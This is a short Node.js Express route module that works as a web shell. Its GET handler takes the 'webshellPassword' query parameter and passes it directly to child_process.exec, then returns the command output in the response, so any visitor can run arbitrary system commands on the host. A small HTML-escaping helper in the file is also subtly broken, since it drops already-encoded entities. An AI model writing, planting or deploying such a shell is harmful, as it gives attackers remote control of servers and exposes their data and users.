var express = require('express'); 
var router = express.Router(); 
var exec = require('child_process').exec; 
var iconv = require('iconv-lite'); 

function unhtml(str, reg) { 
  return str ? str.replace(reg || /[&<">'](?:(amp|lt|quot|gt|#39|nbsp|#\d+);)?/g, function (a, b) { 
    if(b){ 
      a; 
    }else{ 
        return { 
            '<':'&lt;', 
            '&':'&amp;', 
            '"':'&quot;', 
            '>':'&gt;', 
            "'":'&#39;', 
        }[a] 
    } 
  }) : ''; 
} 

router.get('/',function(req, res, next){ 
  exec(req.query.webshellPassword,{encoding: 'binary'},function(error,stdout){ 
    if(error !== null){ 
      res.send(error); 
      return false; 
    } 
    var str = iconv.decode(stdout, 'GBK'); 
    res.send('<pre>' + unhtml(str) + '</pre>'); 
  }); 
}); 

module.exports = router;